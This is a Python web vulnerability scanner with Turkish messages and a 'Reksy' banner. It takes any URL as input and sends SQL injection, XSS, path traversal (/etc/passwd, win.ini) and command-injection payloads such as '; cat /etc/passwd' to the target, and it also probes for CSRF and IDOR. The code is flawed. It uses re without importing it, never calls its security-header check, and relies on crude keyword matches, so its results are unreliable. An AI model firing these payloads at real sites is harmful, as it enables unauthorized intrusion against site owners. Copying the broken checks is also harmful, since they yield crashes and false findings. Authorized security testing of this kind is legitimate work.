import requests
from bs4 import BeautifulSoup


def print_ascii_art():
    art = r"""
 ██▀███  ▓█████  ██ ▄█▀  ██████ ▓██   ██▓
▓██ ▒ ██▒▓█   ▀  ██▄█▒ ▒██    ▒  ▒██  ██▒
▓██ ░▄█ ▒▒███   ▓███▄░ ░ ▓██▄     ▒██ ██░
▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄   ▒   ██▒  ░ ▐██▓░
░██▓ ▒██▒░▒████▒▒██▒ █▄▒██████▒▒  ░ ██▒▓░
░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▒ ▓▒▒ ▒▓▒ ▒ ░   ██▒▒▒ 
  ░▒ ░ ▒░ ░ ░  ░░ ░▒ ▒░░ ░▒  ░ ░ ▓██ ░▒░ 
  ░░   ░    ░   ░ ░░ ░ ░  ░  ░   ▒ ▒ ░░  
   ░        ░  ░░  ░         ░   ░ ░     
                                 ░ ░     
Telegram :@Reksy                Vulnerability Scanner
"""
    print(art)


print_ascii_art()

def test_sql_injection(url):
    payloads = [
        "'", '"', 'OR 1=1', 'OR "a"="a',
        "' OR 1=1 --", '" OR 1=1 --', "UNION SELECT null, null, null --",
        "' AND 1=1 --", '" AND 1=1 --', "' AND 1=1 #", '" AND 1=1 #'
    ]
    for payload in payloads:
        new_url = f"{url}?id={payload}"
        try:
            response = requests.get(new_url)
            if "syntax error" in response.text or "SQL" in response.text or re.search(r"error.*sql", response.text, re.I):
                print(f"Olası SQL Injection zafiyeti tespit edildi: {new_url}")
                return True
        except requests.RequestException as e:
            print(f"SQL Injection testinde bir hata oluştu: {e}")
    return False


def test_xss(url):
    xss_payloads = [
        "<script>alert('XSS')</script>", 
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>", 
        "<body onload=alert(1)>"
    ]
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').lower()
            inputs = form.find_all('input')

            data = {}
            for input_field in inputs:
                input_name = input_field.get('name')
                if input_name:
                    for payload in xss_payloads:
                        data[input_name] = payload
                        if form_method == 'post':
                            response = requests.post(url + form_action, data=data)
                        else:
                            response = requests.get(url + form_action, params=data)
                        if payload in response.text:
                            print(f"Olası XSS zafiyeti tespit edildi: {url}")
                            return True
    except requests.RequestException as e:
        print(f"XSS testinde bir hata oluştu: {e}")
    return False


def test_csrf(url):
    try:
        response = requests.get(url)
        if "csrf" not in response.text.lower():
            # Kontrol için bir CSRF token kontrolü yapılıyor
            response = requests.get(url + "/csrf_test")
            if "csrf" not in response.text.lower():
                print(f"Olası CSRF zafiyeti tespit edildi: {url}")
                return True
    except requests.RequestException as e:
        print(f"CSRF testinde bir hata oluştu: {e}")
    return False

# Dosya Dahil Etme test fonksiyonu
def test_file_inclusion(url):
    payloads = [
        "../../../../etc/passwd", "../../../../windows/win.ini", 
        "/etc/passwd", "/windows/win.ini", 
        "../../../../etc/hosts", "/etc/hosts"
    ]
    for payload in payloads:
        new_url = f"{url}?file={payload}"
        try:
            response = requests.get(new_url)
            if "root:" in response.text or "[fonts]" in response.text or "127.0.0.1" in response.text:
                print(f"Olası Dosya Dahil Etme zafiyeti tespit edildi: {new_url}")
                return True
        except requests.RequestException as e:
            print(f"Dosya Dahil Etme testinde bir hata oluştu: {e}")
    return False


def test_command_injection(url):
    payloads = [
        "; ls", "&& ls", "| ls", "`ls`", 
        "; whoami", "&& whoami", "| whoami", "`whoami`",
        "; cat /etc/passwd", "&& cat /etc/passwd"
    ]
    for payload in payloads:
        new_url = f"{url}?cmd={payload}"
        try:
            response = requests.get(new_url)
            if any(keyword in response.text for keyword in ["bin", "usr", "root", "cat", "whoami"]):
                print(f"Olası Komut Enjeksiyonu zafiyeti tespit edildi: {new_url}")
                return True
        except requests.RequestException as e:
            print(f"Komut Enjeksiyonu testinde bir hata oluştu: {e}")
    return False


def test_directory_traversal(url):
    payloads = [
        "../../../../etc/passwd", "../../../../windows/win.ini", 
        "/etc/passwd", "/windows/win.ini", 
        "/etc/hosts", "../../../../var/log/syslog"
    ]
    for payload in payloads:
        new_url = f"{url}/{payload}"
        try:
            response = requests.get(new_url)
            if "root:" in response.text or "[fonts]" in response.text or "127.0.0.1" in response.text:
                print(f"Olası Dizin Gezinme zafiyeti tespit edildi: {new_url}")
                return True
        except requests.RequestException as e:
            print(f"Dizin Gezinme testinde bir hata oluştu: {e}")
    return False


def test_idor(url):
    try:
        for i in range(1, 10):  # 1'den 10'a kadar test
            response = requests.get(f"{url}/profile?id={i}")
            if f"user{i}" in response.text:
                print(f"Olası IDOR zafiyeti tespit edildi: {url}/profile?id={i}")
                return True
    except requests.RequestException as e:
        print(f"IDOR testinde bir hata oluştu: {e}")
    return False


def test_security_headers(url):
    headers_to_check = [
        "Strict-Transport-Security", "Content-Security-Policy", 
        "X-Content-Type-Options", "X-Frame-Options", 
        "X-XSS-Protection", "Referrer-Policy"
    ]
    try:
        response = requests.get(url)
        headers = response.headers
        missing_headers = [header for header in headers_to_check if header not in headers]
        if missing_headers:
            print(f"Yetersiz güvenlik başlıkları tespit edildi: {missing_headers}")
            return True
    except requests.RequestException as e:
        print(f"Güvenlik başlıkları testinde bir hata oluştu: {e}")
    return False



def vulnerability_scanner(url):
    print("Reksy Tarafından Yapıldı")
    if test_sql_injection(url):
        print(f"{url} üzerinde SQL Injection zafiyeti tespit edildi.")
    else:
        print(f"{url} üzerinde SQL Injection zafiyeti tespit edilmedi.")
    
    if test_xss(url):
        print(f"{url} üzerinde XSS zafiyeti tespit edildi.")
    else:
        print(f"{url} üzerinde XSS zafiyeti tespit edilmedi.")

    if test_csrf(url):
        print(f"{url} üzerinde CSRF zafiyeti tespit edildi.")
    else:
        print(f"{url} üzerinde CSRF zafiyeti tespit edilmedi.")

    if test_file_inclusion(url):
        print(f"{url} üzerinde Dosya Dahil Etme zafiyeti tespit edildi.")
    else:
        print(f"{url} üzerinde Dosya Dahil Etme zafiyeti tespit edilmedi.")

    if test_command_injection(url):
        print(f"{url} üzerinde Komut Enjeksiyonu zafiyeti tespit edildi.")
    else:
        print(f"{url} üzerinde Komut Enjeksiyonu zafiyeti tespit edilmedi.")

    if test_directory_traversal(url):
        print(f"{url} üzerinde Dizin Gezinme zafiyeti tespit edildi.")
    else:
        print(f"{url} üzerinde Dizin Gezinme zafiyeti tespit edilmedi.")

    if test_idor(url):
        print(f"{url} üzerinde IDOR zafiyeti tespit edildi.")
    else:
        print(f"{url} üzerinde IDOR zafiyeti tespit edilmedi.")


target_url = input("Lütfen taramak istediğiniz URL'yi girin: ")
vulnerability_scanner(target_url)
